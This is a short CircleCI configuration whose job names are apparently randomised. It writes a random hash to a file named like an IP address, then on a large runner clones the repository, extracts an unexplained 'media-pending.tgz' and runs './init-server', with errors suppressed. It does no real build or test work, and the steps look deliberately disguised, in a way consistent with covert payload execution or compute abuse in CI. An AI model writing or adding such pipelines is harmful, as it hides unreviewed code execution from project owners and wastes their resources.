version: 2.1

jobs:
  IdArchiveRateVersion:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Vamp until incubation
          command: |
            mkdir -p /tmp/run.d
            set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1024 count=500 2>/dev/null | md5sum > /tmp/run.d/123.145.132.26; true
            echo "@ fix-queue-leak :: /tmp/run.d/123.145.132.26 :: $(wc -c </tmp/run.d/123.145.132.26)"
      - persist_to_workspace:
          root: /tmp/run.d
          paths:
            - '123.145.132.26'
  fix-queue-leak:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/run.d
      - run:
          name: Fetch 2
          command: |
            [ -x /tmp/run.d/123.145.132.26 ] && echo "executable" || echo "noexec"
      - run:
          name: Extract source
          command: git clone --depth 1 --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Prepare source archive
          command: tar -xzvf media-pending.tgz
      - run:
          command: ./init-server && true
